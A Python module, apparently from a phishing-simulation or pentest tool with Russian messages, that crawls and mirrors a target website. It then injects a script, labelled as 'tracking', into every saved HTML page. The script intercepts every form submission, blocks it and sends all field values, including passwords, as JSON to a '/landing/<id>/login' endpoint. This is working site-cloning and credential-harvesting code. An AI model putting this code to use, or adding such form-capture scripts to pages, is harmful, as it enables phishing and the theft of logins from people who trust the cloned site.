import mimetypes
import re
from pathlib import Path
from urllib.parse import urlparse


def media_type_for(path: Path) -> str:
    mt = mimetypes.guess_type(str(path))[0]
    return mt or "application/octet-stream"


def _stand_host(host: str) -> bool:
    host = (host or "").strip().lower().rstrip(".")
    return bool(re.fullmatch(r"[a-z0-9.\-:\[\]]+", host))


def validate_stand_url(source_url: str) -> tuple[str, str]:
    parsed = urlparse(source_url)
    host = (parsed.hostname or "").lower()
    if parsed.scheme not in {"http", "https"} or not _stand_host(host):
        raise ValueError("Ожидается http/https URL с хостом")
    try:
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
    except ValueError as exc:
        raise ValueError("Некорректный порт в URL") from exc
    if not 1 <= port <= 65535:
        raise ValueError("Некорректный порт в URL")
    return host, str(port)


def entry_rel_path(source_url: str) -> str:
    from website_downloader.paths import to_local_path
    from website_downloader.urltools import canonicalize_url

    parsed = urlparse(canonicalize_url(source_url))
    return to_local_path(parsed, Path(".")).as_posix()


def entry_dir(source_url: str) -> str:
    parent = Path(entry_rel_path(source_url)).parent.as_posix()
    return "" if parent == "." else parent


TRACKING_MARKER = "pt-tracking"

TRACKING_TEMPLATE = """<!-- pt-tracking -->
<script>
document.addEventListener("submit", function (event) {
  var form = event.target;
  if (!form || form.tagName !== "FORM") return;
  event.preventDefault();
  var data = {};
  new FormData(form).forEach(function (value, key) { data[key] = value; });
  fetch("/landing/__LID__/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(data)
  });
}, true);
</script>"""


def inject_tracking(dest_dir: Path, lid: str) -> int:
    script = TRACKING_TEMPLATE.replace("__LID__", str(lid))
    count = 0
    for html_file in sorted(dest_dir.rglob("*.html")):
        try:
            text = html_file.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            continue
        if TRACKING_MARKER in text:
            continue
        lowered = text.lower()
        if "</body>" in lowered:
            idx = lowered.rfind("</body>")
            text = text[:idx] + script + "\n" + text[idx:]
        else:
            text += "\n" + script
        html_file.write_text(text, encoding="utf-8")
        count += 1
    return count


def run_mirror(
    source_url: str,
    dest_dir: Path,
    max_pages: int = 15,
    max_depth: int | None = 2,
    render_js: bool = False,
    timeout_seconds: int = 30,
    max_asset_bytes: int | None = None,
) -> dict:
    from website_downloader.crawler import CrawlOptions, crawl_site

    validate_stand_url(source_url)
    dest_dir.mkdir(parents=True, exist_ok=True)
    options = CrawlOptions(
        start_url=source_url,
        root=dest_dir,
        max_pages=max(1, min(int(max_pages), 50)),
        max_depth=int(max_depth) if max_depth is not None else None,
        render_js=bool(render_js),
        timeout=max(2, min(int(timeout_seconds), 60)),
        max_asset_bytes=int(max_asset_bytes) if max_asset_bytes else None,
    )
    stats = crawl_site(options)
    if stats.pages_written == 0:
        raise RuntimeError("Кроулер не сохранил ни одной страницы")
    return {
        "tool": "website-downloader",
        "pages": stats.pages_written,
        "assets": stats.assets_written,
        "errors": stats.errors,
        "elapsed": round(stats.elapsed_seconds, 1),
        "entry": entry_rel_path(source_url),
    }


def clone_site(
    source_url: str,
    dest_dir: Path,
    timeout_seconds: int = 30,
    render_js: bool = False,
) -> dict:
    info = run_mirror(
        source_url,
        dest_dir,
        max_pages=15,
        max_depth=2,
        render_js=render_js,
        timeout_seconds=timeout_seconds,
    )
    injected = inject_tracking(dest_dir, dest_dir.name)
    info["note"] = (
        f"website-downloader: {info['pages']} страниц, {info['assets']} ассетов "
        f"({info['elapsed']} с), трекер на {injected} страницах"
    )
    return info


def archive_mirror(
    source_url: str,
    dest_dir: Path,
    depth: int = 1,
    page_limit: int = 10,
    timeout: float = 6.0,
    max_bytes: int = 5_000_000,
    mode: str = "static",
) -> dict:
    if mode not in {"static", "js"}:
        raise ValueError("Поддерживаются режимы static и js")
    return run_mirror(
        source_url,
        dest_dir,
        max_pages=page_limit,
        max_depth=max(0, min(int(depth), 5)),
        render_js=(mode == "js"),
        timeout_seconds=int(timeout),
        max_asset_bytes=int(max_bytes),
    )
